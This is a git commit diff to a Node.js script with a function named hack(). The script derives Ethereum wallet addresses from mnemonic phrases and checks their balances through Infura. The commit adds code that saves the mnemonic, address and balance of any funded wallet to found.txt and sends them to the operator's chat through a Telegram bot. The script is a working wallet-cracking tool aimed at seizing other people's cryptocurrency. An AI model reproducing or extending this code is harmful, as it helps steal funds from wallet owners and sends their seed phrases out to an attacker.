30566bb3d43e585db831cec61d3835250a58f1e9
Ilyas Esmail <ilyas@esmail.pt>
2021-05-27 12:27:29 +0100

    Add Telegram notifications and Output Every check on console
    To create a Telegram bot, use @BotFather and find your chatId using getUpdates method of Telegram API.

--- Generate_Addresses_From_Seed.js
+++ Generate_Addresses_From_Seed.js
@@ -3,6 +3,10 @@ const Web3 = require('web3');
 const hdkey = require('ethereumjs-wallet');
 const bip39 = require('bip39');
 const web3 = new Web3('https://mainnet.infura.io/v3/*Your infura key*');
+const TelegramBot = require('node-telegram-bot-api');
+const token = '*YOUR_TELEGRAM_BOT_TOKEN*';
+const bot = new TelegramBot(token, {polling: true});
+const chatId = '*CHAT_ID*';
 
 async function hack () {
     const path = "m/44'/60'/0'/0/0";
@@ -20,12 +24,18 @@ async function hack () {
         address = `0x${wallet.getAddress().toString('hex')}`;
         balance = await web3.eth.getBalance(address);
         process.stdout.cursorTo(0);
-        process.stdout.write(`Checking: ${address}`);
+        console.log(`Checking: ${address}, Balance: ` + balance + `ETH, https://etherscan.io/address/${address}`);
         if(balance > 0) {
             console.log('\n');
             console.log('mnemonic --->>' + ' '+ mnemonicPhrase)
             console.log('balance --->>' + ' '+ balance)
             console.log('\n');
+            fs.appendFile("found.txt", `Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`, (err) => { 
+                if (err) { 
+                    console.log(err); 
+                } 
+            });
+            bot.sendMessage(chatId, `Found: ${address}, https://etherscan.io/address/${address}, ${mnemonicPhrase}, ${balance}`);
         }
     }
 }
